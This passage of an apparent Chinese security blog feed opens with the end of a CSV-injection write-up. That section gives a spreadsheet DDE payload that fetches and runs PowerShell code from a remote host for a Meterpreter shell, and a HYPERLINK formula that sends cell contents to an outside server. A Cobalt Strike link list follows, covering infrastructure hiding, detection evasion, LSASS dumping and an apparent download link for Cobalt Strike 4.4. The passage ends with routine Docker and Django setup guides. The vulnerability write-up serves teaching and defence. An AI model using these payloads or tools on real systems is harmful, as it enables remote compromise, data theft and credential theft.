<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>这类漏洞通常不会针对于专业的网络安全人员，毕竟是个搞安全的都知道<strong>cmd</strong>不要随便启用，但是对于大部分人来说，尤其是正常的企业员工，往往会忽视问题的严重性，可能随手就点了个<strong>是</strong>，因此这类漏洞一种利用方式可以用于钓鱼，另一种也和钓鱼类似，需要网站后台存在导出excel功能，攻击者通过污染数据，当管理员或者其他用户需要用到导出excel功能时，被污染的数据被一起导出，当打开该文件时并且忽略告警提示点了<strong>是</strong>，一起完美的攻击就完成了。</p>
<h2 id="漏洞拓展"><a href="#漏洞拓展" class="headerlink" title="漏洞拓展"></a>漏洞拓展</h2><p><strong>Meterpreter Shell</strong> 上线</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=cmd|&#x27;/C powershell IEX(wget xxx.xxxx/1X146m3)&#x27;!A0</span><br></pre></td></tr></table></figure>

<p>注入代码模板：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=cmd|&#x27;/C ping 127.0.0.1&#x27;!A0</span><br><span class="line">=cmd|&#x27;/C xxx xxx&#x27;!A0</span><br></pre></td></tr></table></figure>

<p>在投票等场景插入了恶意代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=HYPERLINK(&quot;http://linux.im?test=&quot;&amp;A2&amp;A3,&quot;Error: Please click me!&quot;)</span><br></pre></td></tr></table></figure>

<p>这样就导致当用户在导出报表后倘若点击了某个单元格则会导致 A2,A3 的单元格内容泄露：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/CSV注入漏洞总结/image-20210710212838625.png" alt="image-20210710212838625" style="zoom:50%;" />





<h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>过滤公式所用到的特殊字符（不应盲目过滤），因为个别情况下可能会影响产品的正常功能使用：</p>
<ul>
<li>手机号码 +86 xxxxx</li>
<li>邮箱地址 @test.com</li>
<li>字符串 test-injection</li>
</ul>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.freebuf.com/vuls/195656.html">https://www.freebuf.com/vuls/195656.html</a></p>
<p><a href="https://www.hacking8.com/bugbounty-cheatsheet/cheatsheets/csv-injection.html">https://www.hacking8.com/bugbounty-cheatsheet/cheatsheets/csv-injection.html</a></p>
<p><a href="https://blog.knownsec.com/2016/05/csv-injection-vulnerability/">https://blog.knownsec.com/2016/05/csv-injection-vulnerability/</a></p>
]]></content>
      <categories>
        <category>漏洞总结</category>
      </categories>
      <tags>
        <tag>基础漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>CobaltStrike 系列文章</title>
    <url>/posts/f5c658b7.html</url>
    <content><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>收集到的网络上的 CS 文章，包含部署隐藏，上线提醒等等技巧</p>
<p><strong>教程</strong></p>
<ul>
<li><a href="https://github.com/aleenzz/Cobalt_Strike_wiki">aleenzz&#x2F;Cobalt_Strike_wiki</a></li>
<li><a href="https://blog.ateam.qianxin.com/post/cobalt-strike-40-shou-ce-fan-yi-2019-nian-12-yue-2-ri-geng-xin-ban-ben/">Cobalt Strike 4.0 手册翻译</a></li>
</ul>
<p><strong>Fofa</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cert=&quot;73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F&quot;</span><br></pre></td></tr></table></figure>





<h1 id="0x01-隐藏"><a href="#0x01-隐藏" class="headerlink" title="0x01 隐藏"></a>0x01 隐藏</h1><p><a href="https://mp.weixin.qq.com/s/2EQ6-NjUDG90Ge5Ml_1X_Q">https://mp.weixin.qq.com/s/2EQ6-NjUDG90Ge5Ml_1X_Q</a></p>
<p><a href="https://mp.weixin.qq.com/s/V6huSfYfl355HXgUnflAOA">https://mp.weixin.qq.com/s/V6huSfYfl355HXgUnflAOA</a></p>
<p><a href="https://mp.weixin.qq.com/s/ssi71BzvLBnuR8dZj-9Ccg">https://mp.weixin.qq.com/s/ssi71BzvLBnuR8dZj-9Ccg</a></p>
<h1 id="0x02-上线"><a href="#0x02-上线" class="headerlink" title="0x02 上线"></a>0x02 上线</h1><p><a href="https://mp.weixin.qq.com/s/m88skTT0xdooLqSGP4BXAQ">https://mp.weixin.qq.com/s/m88skTT0xdooLqSGP4BXAQ</a></p>
<p><a href="https://mp.weixin.qq.com/s/gYyB-vNskvXVubV9s_Dzgw">https://mp.weixin.qq.com/s/gYyB-vNskvXVubV9s_Dzgw</a></p>
<p>上线提醒</p>
<p><a href="https://github.com/lintstar/CS-PushPlus">https://github.com/lintstar/CS-PushPlus</a></p>
<p>绕过 vultr 特征检测</p>
<p><a href="https://www.wangan.com/p/7fy74727d2f60d4f">https://www.wangan.com/p/7fy74727d2f60d4f</a></p>
<p><a href="http://www.javaheidong.com/blog/article/344451/46db0472067ab95e51f2/">http://www.javaheidong.com/blog/article/344451/46db0472067ab95e51f2/</a></p>
<h1 id="0x03-插件"><a href="#0x03-插件" class="headerlink" title="0x03 插件"></a>0x03 插件</h1><p><strong>插件</strong></p>
<p>Cobalt Strike 可以使用 AggressorScripts 脚本来加强自身，能够扩展菜单栏，Beacon 命令行，提权脚本等</p>
<ul>
<li><a href="https://github.com/rmikehodges/cs-ssl-gen">rmikehodges&#x2F;cs-ssl-gen</a> sslgen 将安装一个 letsencrypt 证书并从中创建一个 Cobalt Strike 密钥库.</li>
<li><a href="https://github.com/uknowsec/SharpToolsAggressor">uknowsec&#x2F;SharpToolsAggressor</a> - 内网渗透中常用的 c# 程序整合成 cs 脚本, 直接内存加载.</li>
<li><a href="https://github.com/DeEpinGh0st/Erebus">DeEpinGh0st&#x2F;Erebus</a> CobaltStrike 后渗透测试插件</li>
<li><a href="https://github.com/QAX-A-Team/EventLogMaster">QAX-A-Team&#x2F;EventLogMaster</a> - RDP 日志取证 &amp; 清除插件</li>
<li><a href="https://github.com/outflanknl/Spray-AD">outflanknl&#x2F;Spray-AD</a> - Cobalt Strike工具，用于审核 AD 用户帐户中的弱密码</li>
<li><a href="https://github.com/gloxec/CrossC2">gloxec&#x2F;CrossC2</a> - generate CobaltStrike’s cross-platform payload</li>
<li><a href="https://github.com/lintstar/LSTAR">lintstar&#x2F;LSTAR</a> - LSTAR - CobaltStrike 综合后渗透插件</li>
<li><a href="https://github.com/AttackTeamFamily/cobaltstrike-bof-toolset">AttackTeamFamily&#x2F;cobaltstrike-bof-toolset</a> - 在cobaltstrike中使用的bof工具集，收集整理验证好用的bof。</li>
<li><a href="https://github.com/outflanknl/PrintNightmare">outflanknl&#x2F;PrintNightmare</a></li>
<li><a href="https://github.com/helpsystems/nanodump">helpsystems&#x2F;nanodump</a> - Dumping LSASS has never been so stealthy</li>
<li><a href="https://github.com/optiv/Registry-Recon">optiv&#x2F;Registry-Recon</a> - Cobalt Strike Aggressor Script that Performs System&#x2F;AV&#x2F;EDR Recon</li>
</ul>
<h1 id="0x04-文章-amp-Reference"><a href="#0x04-文章-amp-Reference" class="headerlink" title="0x04 文章 &amp; Reference"></a>0x04 文章 &amp; Reference</h1><ul>
<li>[cobalt strike 快速上手 <a href="https://www.freebuf.com/column/149236.html"> 一 ] - FreeBuf专栏·攻防之路</a></li>
<li><a href="https://www.3hack.com/note/96.html">教你修改cobalt strike的50050端口 - 3HACK</a></li>
<li><a href="https://github.com/ryanohoro/csbruter">ryanohoro&#x2F;csbruter: Cobalt Strike team server password brute force tool</a></li>
<li><a href="https://xz.aliyun.com/t/7938">踩坑记录-DNS Beacon</a></li>
<li><a href="https://0x20h.com/p/8dee.html">CS通过CDN上线</a></li>
<li><a href="https://paper.seebug.org/1190/">渗透利器 Cobalt Strike 在野利用情况专题分析</a></li>
<li><a href="https://mp.weixin.qq.com/s/AePKPUDnBUr4WbJqvPCleg">为 CobaltStrike TeamServer 加上谷歌二次验证</a></li>
<li>Cobalt Strike: Using Known Private Keys To Decrypt Traffic – Part 2<ul>
<li><a href="https://mp.weixin.qq.com/s/AcIFSjyqn9gzyRkyx3sRIQ">破解版密钥相同，部分CobaltStrike加密流量可解</a></li>
</ul>
</li>
</ul>
<h1 id="0x05-实验"><a href="#0x05-实验" class="headerlink" title="0x05 实验"></a>0x05 实验</h1><p><a href="https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/C2%E5%AE%9E%E9%AA%8C.md#%E9%87%8D%E5%AE%9A%E5%90%91">https://github.com/ffffffff0x/1earn/blob/master/1earn/Security/RedTeam/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%AE%9E%E9%AA%8C/C2%E5%AE%9E%E9%AA%8C.md#%E9%87%8D%E5%AE%9A%E5%90%91</a></p>
<h1 id="0x0-下载"><a href="#0x0-下载" class="headerlink" title="0x0 下载"></a>0x0 下载</h1><p><a href="https://www.upload.ee/files/13456591/Cobalt_Strike_4.4__August_04__2021_.7z.html">https://www.upload.ee/files/13456591/Cobalt_Strike_4.4__August_04__2021_.7z.html</a></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>CS</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 安装和基础命令</title>
    <url>/posts/dd87411b.html</url>
    <content><![CDATA[<h2 id="1-卸载旧版本"><a href="#1-卸载旧版本" class="headerlink" title="1. 卸载旧版本"></a>1. 卸载旧版本</h2><p>Docker 的旧版本被称为 docker，docker.io 或 docker-engine 。如果已安装，请卸载它们：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>

<p>当前称为 Docker Engine-Community 软件包 docker-ce 。</p>
<h2 id="2-添加GPG密钥并添加更新源"><a href="#2-添加GPG密钥并添加更新源" class="headerlink" title="2. 添加GPG密钥并添加更新源"></a>2. 添加GPG密钥并添加更新源</h2><blockquote>
<p> 将清华镜像的GPG密钥下载下来并且将该镜像加入到系统配置的镜像中去。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>

<p>运行截图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/image-20210530115227367.png" alt="image-20210530115227367"></p>
<blockquote>
<p>把清华的镜像添加进系统配置。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27; | sudo tee /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<p>运行截图：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/image-20210530115522685.png" alt="image-20210530115522685"></p>
<h2 id="3-系统更新以及安装docker"><a href="#3-系统更新以及安装docker" class="headerlink" title="3. 系统更新以及安装docker"></a>3. 系统更新以及安装docker</h2><blockquote>
<p>系统更新</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/image-20210530115929999.png" alt="image-20210530115929999"></p>
<blockquote>
<p>安装dokcer</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-ce</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/image-20210530115954543.png" alt="image-20210530115954543"></p>
<h2 id="4-启动docker服务器"><a href="#4-启动docker服务器" class="headerlink" title="4. 启动docker服务器"></a>4. 启动docker服务器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>

<h2 id="5-安装compose"><a href="#5-安装compose" class="headerlink" title="5. 安装compose"></a>5. 安装compose</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-compose</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/image-20210530120634489.png" alt="image-20210530120634489"></p>
<h2 id="6-Docker安装测试（hello-world）"><a href="#6-Docker安装测试（hello-world）" class="headerlink" title="6. Docker安装测试（hello-world）"></a>6. Docker安装测试（hello-world）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/image-20210530120719134.png" alt="image-20210530120719134"></p>
<p>成功运行第一个docker项目。</p>
<h2 id="7-卸载-docker"><a href="#7-卸载-docker" class="headerlink" title="7. 卸载 docker"></a>7. 卸载 docker</h2><p>删除安装包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get purge docker-ce</span><br></pre></td></tr></table></figure>

<p>删除镜像、容器、配置文件等内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>

<h2 id="8-docker容器的操作"><a href="#8-docker容器的操作" class="headerlink" title="8. docker容器的操作"></a>8. docker容器的操作</h2><p>运行时的容器无法删除，只能停止后删除，或者加上-f参数强制删除</p>
<blockquote>
<p>启动容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//docker run 容器的名字</span><br><span class="line">docker run -d resis</span><br></pre></td></tr></table></figure>

<blockquote>
<p>启动守护式容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -i -t 容器名 /bin/bash</span><br><span class="line">//-i交互模式，-t指定一个伪终端或者终端</span><br><span class="line">例如：</span><br><span class="line">docker run -i -t centos /bin/bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>退出守护容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看运行中的容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式 docker ps [-a] [-l]</span><br><span class="line">// -a 表示列举所有容器</span><br><span class="line">// -l 表示列举最近创建的容器</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看所有的容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看所有容器的id</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -aq</span><br></pre></td></tr></table></figure>

<blockquote>
<p>停止容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop 容器id或容器名称</span><br></pre></td></tr></table></figure>

<blockquote>
<p>重启容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start 容器id或容器名称</span><br></pre></td></tr></table></figure>

<blockquote>
<p>删除容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm 容器id或容器名称</span><br></pre></td></tr></table></figure>

<blockquote>
<p>停用全部运行中的容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -q)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>删除全部容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>停用并删除容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -q) &amp; docker rm -f $(docker ps -aq)</span><br></pre></td></tr></table></figure>

<h2 id="9-镜像的操作"><a href="#9-镜像的操作" class="headerlink" title="9. 镜像的操作"></a>9. 镜像的操作</h2><blockquote>
<p>下载镜像</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull redis:latest</span><br></pre></td></tr></table></figure>

<p>获取镜像有两种方式:</p>
<ol>
<li><p>从官方镜像仓库下载</p>
</li>
<li><p>通过Dockerfile文件构建</p>
<p>通过docker-compose.yml文件构建并运行镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Docker%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/image-20210530140428785.png" alt="image-20210530140428785"></p>
</li>
</ol>
<blockquote>
<p>列出已下载的镜像</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">或者</span><br><span class="line">docker images redis</span><br></pre></td></tr></table></figure>

<blockquote>
<p>运行镜像</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d redis</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看redis进程</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看容器镜像状态</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<blockquote>
<p>进入容器 </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 镜像ID bash</span><br><span class="line">docker exec -it 镜像N bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>删除镜像</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi redis:latest</span><br></pre></td></tr></table></figure>

<h2 id="10-遇到的问题"><a href="#10-遇到的问题" class="headerlink" title="10. 遇到的问题"></a>10. 遇到的问题</h2><p><a href="https://www.cnblogs.com/python-wen/p/11224555.html">解决报错Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: TLS handshaketimeout</a></p>
<p>通过<code>dig @114.114.114.114 registry-1.docker.io</code>找到可用IP地址</p>
<p>修改<code>/etc/hosts</code>强制docker.io相关的域名解析到其它可用IP</p>
]]></content>
      <tags>
        <tag>杂谈</tag>
      </tags>
  </entry>
  <entry>
    <title>Django 项目线上部署</title>
    <url>/posts/318a528a.html</url>
    <content><![CDATA[<h1 id="Django-项目线上部署"><a href="#Django-项目线上部署" class="headerlink" title="Django 项目线上部署"></a>Django 项目线上部署</h1><h2 id="一、安装环境"><a href="#一、安装环境" class="headerlink" title="一、安装环境"></a>一、安装环境</h2><h3 id="1-yum-安装可能需要的依赖包"><a href="#1-yum-安装可能需要的依赖包" class="headerlink" title="1. yum 安装可能需要的依赖包"></a>1. yum 安装可能需要的依赖包</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum install zlib-devel bzip2-devel epel-release nginx libffi-devel openssl-devel ncurses-devel sqlite-devel readline-devel tk-devel gcc make -y</span><br></pre></td></tr></table></figure>

<h3 id="2-升级Sqlte3"><a href="#2-升级Sqlte3" class="headerlink" title="2. 升级Sqlte3"></a>2. 升级Sqlte3</h3><blockquote>
<p>因为Django需要更高版本的Sqlite，而系统自带的不满足条件，报错如下</p>
<p>django.core.exceptions.ImproperlyConfigured: SQLite 3.8.3 or later is required (found 3.7.17).</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建一个download文件夹，后续的文件都放在这里，为了方便管理</span><br><span class="line">mkdir /root/download</span><br><span class="line">cd /root/download</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/download</span><br><span class="line"># 下载源码</span><br><span class="line">wget https://www.sqlite.org/2019/sqlite-autoconf-3290000.tar.gz</span><br><span class="line"># 编译</span><br><span class="line">tar zxvf sqlite-autoconf-3290000.tar.gz </span><br><span class="line">cd sqlite-autoconf-3290000/</span><br><span class="line">./configure --prefix=/usr/local</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"></span><br><span class="line"># 替换系统低版本 sqlite3</span><br><span class="line">mv /usr/bin/sqlite3  /usr/bin/sqlite3_old</span><br><span class="line">ln -s /usr/local/bin/sqlite3   /usr/bin/sqlite3</span><br><span class="line">echo &quot;/usr/local/lib&quot; &gt; /etc/ld.so.conf.d/sqlite3.conf</span><br><span class="line">ldconfig</span><br><span class="line">sqlite3 -version</span><br></pre></td></tr></table></figure>

<h3 id="3-安装Python"><a href="#3-安装Python" class="headerlink" title="3. 安装Python"></a>3. 安装Python</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root/download</span><br><span class="line"># 下载python3.7</span><br><span class="line">wget https://www.python.org/ftp/python/3.7.0/Python-3.7.0.tar.xz</span><br><span class="line"># 解压</span><br><span class="line">tar xvf Python-3.7.0.tar.xz</span><br><span class="line"># 进入</span><br><span class="line">cd Python-3.7.0</span><br><span class="line"># 编译</span><br><span class="line">./configure --with-ssl --prefix=/usr/local/python3</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line"># 其中--prefix是Python的安装目录</span><br><span class="line"># 加上–with-ssl参数,默认安装的软件涉及到ssl的功能才可用，比如pip的更新</span><br><span class="line"># 安装完成之后 建立软链接 添加变量 方便在终端中直接使用python3</span><br><span class="line">ln -s /usr/local/python3/bin/python3.6 /usr/bin/python3</span><br><span class="line">#Python3安装完成之后pip3也一块安装完成，不需要再单独安装</span><br><span class="line">#同样给pip3建立软链接</span><br><span class="line">ln -s /usr/local/python3/bin/pip3.7 /usr/bin/pip3</span><br></pre></td></tr></table></figure>

<h3 id="4-安装virtualenv"><a href="#4-安装virtualenv" class="headerlink" title="4. 安装virtualenv"></a>4. 安装virtualenv</h3><blockquote>
<p>这一步是为了创建python的虚拟环境，方面管理python环境</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 因为需要经常使用虚拟环境，所以放在一个简单的地方</span><br><span class="line">cd /root</span><br><span class="line"># 安装</span><br><span class="line">pip3 install virtualenv</span><br><span class="line"># 创建虚拟环境</span><br><span class="line">virtualenv -p python3 py37env</span><br><span class="line"># 启动环境</span><br><span class="line">source py37env/bin/activate</span><br><span class="line"># 停止环境</span><br><span class="line">deactivate</span><br></pre></td></tr></table></figure>

<h3 id="5-安装-uwsgi"><a href="#5-安装-uwsgi" class="headerlink" title="5. 安装 uwsgi"></a>5. 安装 uwsgi</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install uwsgi</span><br><span class="line"># 给uwsgi建立软链接，方便使用</span><br><span class="line">ln -s /usr/local/python3/bin/uwsgi /usr/bin/uwsgi</span><br></pre></td></tr></table></figure>

<blockquote>
<p>uwsgi需要安装两次，先在系统里安装一次，然后进入对应的虚拟环境安装一次。</p>
</blockquote>
<h3 id="6-安装-Django项目依赖包"><a href="#6-安装-Django项目依赖包" class="headerlink" title="6. 安装 Django项目依赖包"></a>6. 安装 Django项目依赖包</h3><blockquote>
<p>部署到线上环境，需提前在开发环境执行 pip freeze &gt; requirements.txt 命令</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd 你的项目requirements.txt所在目录</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>

<h2 id="二、配置一下uwsgi"><a href="#二、配置一下uwsgi" class="headerlink" title="二、配置一下uwsgi"></a>二、配置一下uwsgi</h2><blockquote>
<p>先确保项目能跑起来，下面的配置方式任选一种</p>
</blockquote>
<p><strong>第一种:XML格式的配置文件</strong></p>
<p>我们网站项目路径是 &#x2F;data&#x2F;wwwroot&#x2F;mysite&#x2F;,在项目根目录下创建<br>mysite.xml文件，输入如下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;uwsgi&gt;    </span><br><span class="line">   &lt;socket&gt;127.0.0.1:8000&lt;/socket&gt; &lt;!-- 内部端口，自定义 --&gt; </span><br><span class="line">   &lt;chdir&gt;/data/wwwroot/mysite/&lt;/chdir&gt; &lt;!-- 项目路径 --&gt;            </span><br><span class="line">   &lt;module&gt;mysite.wsgi&lt;/module&gt;  &lt;!-- mysite为wsgi.py所在目录名--&gt; </span><br><span class="line">   &lt;processes&gt;4&lt;/processes&gt; &lt;!-- 进程数 --&gt;     </span><br><span class="line">   &lt;daemonize&gt;uwsgi.log&lt;/daemonize&gt; &lt;!-- 日志文件 --&gt;</span><br><span class="line">&lt;/uwsgi&gt;</span><br></pre></td></tr></table></figure>

<p>保存<br>注意<module>里的mysite，为wsgi.py所在的目录名。</p>
<p>这种方式的配置,可以用下面的命令启动.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#启动uwsgi</span><br><span class="line">uwsgi -x mysite.xml</span><br><span class="line">#uwsgi有没有启动成功,可以用下面的命令查看</span><br><span class="line">ps -ef|grep uwsgi</span><br><span class="line">#如果想重启uwsgi,先使用下面的命令杀掉进程,再启动uwsgi</span><br><span class="line">killall -9 uwsgi</span><br></pre></td></tr></table></figure>

<p><strong>第二种:ini格式的配置文件</strong></p>
<p>在项目文件里创建 uwsgi.ini 文件,编辑文件 ，设置uwsgi属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#添加配置选择</span><br><span class="line">[uwsgi]</span><br><span class="line">#配置和nginx连接的socket连接</span><br><span class="line">socket=127.0.0.1:8000</span><br><span class="line">#配置项目路径，项目的所在目录</span><br><span class="line">chdir=/data/wwwroot/mysite/</span><br><span class="line">#配置wsgi接口模块文件路径,也就是wsgi.py这个文件所在的目录名</span><br><span class="line">wsgi-file=mysite/wsgi.py</span><br><span class="line">#配置启动的进程数</span><br><span class="line">processes=4</span><br><span class="line">#配置每个进程的线程数</span><br><span class="line">threads=2</span><br><span class="line">#配置启动管理主进程</span><br><span class="line">master=True</span><br><span class="line">#配置存放主进程的进程号文件</span><br><span class="line">pidfile=uwsgi.pid</span><br><span class="line">#配置dump日志记录</span><br><span class="line">daemonize=uwsgi.log`</span><br></pre></td></tr></table></figure>

<p>通过下面的命令启动运行uwsgi</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uwsgi  --ini  uwsgi.ini</span><br></pre></td></tr></table></figure>

<p>显示 [uWSGI] getting INI configuration from uwsgi.ini 表明uwsgi运行成功</p>
<p>可能通过ps -ef|grep uwsgi  查看确认是否uwsgi启动.</p>
<p>ini配置文件其它相关命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#停止运行uwsgi，通过包含主进程编号的文件设置停止项目</span><br><span class="line">uwsgi --stop uwsgi.pid</span><br><span class="line">#重启uwsgi</span><br><span class="line">uwsgi --reload uwsgi.pid</span><br></pre></td></tr></table></figure>

<h2 id="三、配置-nginx"><a href="#三、配置-nginx" class="headerlink" title="三、配置 nginx"></a>三、配置 nginx</h2><p>nginx一般默认安装好的路径为&#x2F;usr&#x2F;local&#x2F;nginx<br>在&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;中先备份一下nginx.conf文件，以防意外。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp nginx.conf nginx.conf.bak</span><br></pre></td></tr></table></figure>

<p>然后打开nginx.conf，将文件内容替换为以下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># For more information on configuration, see:</span><br><span class="line">#   * Official English Documentation: http://nginx.org/en/docs/</span><br><span class="line">#   * Official Russian Documentation: http://nginx.org/ru/docs/</span><br><span class="line"></span><br><span class="line">user root;</span><br><span class="line">worker_processes auto;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line"></span><br><span class="line"># Load dynamic modules. See /usr/share/doc/nginx/README.dynamic.</span><br><span class="line">include /usr/share/nginx/modules/*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                      &#x27;$status $body_bytes_sent &quot;$http_referer&quot; 